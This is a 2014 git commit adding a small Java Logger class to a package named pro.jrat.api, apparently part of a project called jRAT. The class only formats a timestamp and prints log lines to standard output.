d73c16dba9661535294a2d1fc8a98d9384b2a8f3
redpois0n <red@cmail.nu>
2014-01-01 18:39:08 +0100

    Logger

---
+++ src/pro/jrat/api/Logger.java
@@ -0,0 +1,21 @@
+package pro.jrat.api;
+
+import java.util.Date;
+
+@SuppressWarnings("deprecation")
+public class Logger {
+
+	public static void log(String line) {
+		Date date = new Date(System.currentTimeMillis());
+		
+		String hours = (date.getHours() + "").length() == 1 ? "0" + date.getHours() : Integer.toString(date.getHours());
+		String minutes = (date.getMinutes() + "").length() == 1 ? "0" + date.getMinutes() : Integer.toString(date.getMinutes());
+		String seconds = (date.getSeconds() + "").length() == 1 ? "0" + date.getSeconds() : Integer.toString(date.getSeconds());
+		
+		String time = hours + ":" + minutes + ":" + seconds;
+		
+		String s = "[" + time + "] [LOG]: " + line;
+		
+		System.out.println(s);
+	}
+}
